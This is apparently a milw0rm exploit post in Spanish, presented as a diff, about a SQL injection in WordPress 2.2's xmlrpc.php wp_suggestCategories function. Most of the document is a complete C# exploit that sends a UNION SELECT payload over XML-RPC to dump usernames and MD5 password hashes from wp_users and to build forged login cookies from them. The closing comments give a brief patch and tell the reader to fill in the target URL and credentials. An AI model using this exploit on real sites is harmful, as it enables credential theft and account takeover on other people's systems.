@@ -1,0 +1,175 @@
+/*
+El error, bastante tonto por cierto, se encuentra en la función wp_suggestCategories, en el archivo xmlrpc.php:
+ 
+function wp_suggestCategories($args) {
+        global $wpdb;
+
+        $this->escape($args);
+
+        $blog_id                             = (int) $args[0];
+        $username                            = $args[1];
+        $password                            = $args[2];
+        $category                            = $args[3];
+        $max_results            	     = $args[4];
+
+        if(!$this->login_pass_ok($username, $password)) {
+                return($this->error);
+        }
+
+        // Only set a limit if one was provided.
+        $limit = "";
+        if(!empty($max_results)) {
+                $limit = "LIMIT {$max_results}";
+        }
+
+        $category_suggestions = $wpdb->get_results("
+                SELECT cat_ID category_id,
+                        cat_name category_name
+                FROM {$wpdb->categories}
+                WHERE cat_name LIKE '{$category}%'
+                {$limit}
+        ");
+
+        return($category_suggestions);
+}
+
+Como se puede observar en la porción de código, no se hace una conversión a entero del valor de $max_results, por lo que es posible enviar valores del tipo 0 UNION ALL SELECT user_login, user_pass FROM wp_users. Para que un atacante logre su objetivo, es necesario que éste tenga una cuenta de usuario válida (una cuenta de tipo suscriber basta y sobra) en el sitio víctima.
+
+Preparé un pequeño exploit (Creditos: Alex) que devuelve la lista de usuarios con sus respectivas contraseñas en MD5, además también incluye las cookies de autenticación para cada usuario.
+
+Credits: Alex de la Concha
+
+code c sharp:
+*/
+ 
+using System;
+using System.Net;
+using System.Text;
+using System.Xml;
+using System.Text.RegularExpressions;
+using System.Security.Cryptography;
+
+class Program
+{
+    static void Main(string[] args)
+    {
+        string targetUrl = "http://localhost/wp/";
+        string login = "alex";
+        string password = "1234";
+
+        string data = @"<methodCall>
+  <methodName>wp.suggestCategories</methodName>
+  <params>
+    <param><value>1</value></param>
+    <param><value>{0}</value></param>
+    <param><value>{1}</value></param>
+    <param><value>1</value></param>
+    <param><value>0 UNION ALL SELECT user_login, user_pass FROM {2}users</value></param>
+  </params>
+</methodCall>";
+
+        string cookieHash = GetCookieHash(targetUrl);
+
+        using (WebClient request = new WebClient())
+        {
+            /* Probar con el prefijo por omisión */
+            string response = request.UploadString(targetUrl + "xmlrpc.php",
+                string.Format(data, login, password, "wp_svn_"));
+
+            /* Se hace una nueva petición si la consulta anterior falla */
+            Match match = Regex.Match(response, @"FROM\s+(.*?)categories\s+");
+            if (match.Success)
+            {
+                response = request.UploadString(targetUrl + "xmlrpc.php ",
+                    string.Format(data, login, password, match.Groups[1].Value));
+            }
+
+            try
+            {
+                XmlDocument doc = new XmlDocument();
+                doc.LoadXml(response);
+
+                XmlNodeList nodes = doc.SelectNodes("//struct/member/value");
+
+                if (nodes != null && doc.SelectSingleNode("/methodResponse/fault") == null)
+                {
+                    string user, pass;
+                    /* Mostrar lista de:
+                     * Usuario     md5(contraseña)
+                     * Cookie de Autenticación
+                     *
+                     */
+                    for (int i = 0; i < nodes.Count / 2 + 1; i += 2)
+                    {
+                        user = nodes.Item(i).InnerText;
+                        pass = nodes.Item(i + 1).InnerText;
+                        Console.WriteLine("Usuario: {0}\tMD5(Contraseña): {1}",
+                            user,
+                            pass);
+                        Console.WriteLine("Cookie: wordpressuser_{0}={1};wordpresspass_{0}={2}\n",
+                            cookieHash,
+                            user,
+                            MD5(pass));
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("Error:\n{0}", response);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error:\n" + ex.ToString());
+            }
+        }
+    }
+
+    private static string GetCookieHash(string targetUrl)
+    {
+        WebRequest request = WebRequest.Create(targetUrl + "wp-login.php?action=logout");
+        request.Method = "HEAD";
+        (request as HttpWebRequest).AllowAutoRedirect = false;
+
+        WebResponse response = request.GetResponse();
+        if (response != null)
+        {
+            Match match = Regex.Match(response.Headers["Set-Cookie"],
+                    @"wordpress[a-z]+_([a-z\d]{32})",
+                    RegexOptions.IgnoreCase);
+
+            if (match.Success)
+                return match.Groups[1].Value;
+        }
+        return string.Empty;
+    }
+    public static string MD5(string password)
+    {
+        MD5CryptoServiceProvider x = new MD5CryptoServiceProvider();
+        byte[] bs = Encoding.UTF8.GetBytes(password);
+        bs = x.ComputeHash(bs);
+        StringBuilder s = new StringBuilder();
+        foreach (byte b in bs)
+        {
+            s.Append(b.ToString("x2").ToLower());
+        }
+        return s.ToString();
+    }
+}
+/*
+Para corregir este problema, mientras liberan actualizaciones para Wordpress 2.2, es editar el archivo xmlrpc.php y cambiar la línea $max_results = $args[4]; de la función wp_suggestCategories por $max_results = (int) $args[4]; o en su defecto bloquear el acceso a xmlrpc.php.
+
+o malo esque tienes que tener una cuenta aunque sea con los minimos permisos para obtener los demas nombres de users con sus respectivos MD5.
+
+    static void Main(string[] args)
+    {
+        string targetUrl = "http://localhost/wp/";
+        string login = "alex";
+        string password = "1234";
+
+hay seria la ruta donde esta colocado el wordpress 2.2, tu nombre de usuario y tu password.
+Ya se creo un zip con los archivos vulnerables ya reparados [ xmlrpc.php, wp-admin/post-new.php, wp-admin/page-new.php , wp-admin/users-edit.php. ]
+
+:: [Slappter] ::
+*/
+
+# milw0rm.com [2007-06-06]
